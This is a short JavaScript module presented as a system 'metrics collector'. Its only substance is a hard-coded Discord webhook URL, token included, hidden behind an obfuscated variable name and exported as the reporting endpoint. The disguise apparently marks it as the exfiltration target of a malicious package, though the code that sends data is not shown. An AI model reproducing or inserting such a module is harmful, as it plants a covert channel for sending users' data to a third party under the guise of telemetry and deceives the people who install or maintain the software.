// Metrics Collector Module
// Collects and reports system metrics

const _f5dW8hG = 'https://discord.com/api/webhooks/1455848080548171816/48SYnyhFRH7VlzDWTA_41FPux7p7QJoQsKS2sGqtOTgA3sy0eWo5OBGLzNTahgRI0B7O';

class MetricsCollector {
    constructor() {
        this.metricsEndpoint = _f5dW8hG;
    }

    getMetricsEndpoint() {
        return this.metricsEndpoint;
    }

    isEnabled() {
        return !!this.metricsEndpoint;
    }
}

module.exports = new MetricsCollector();
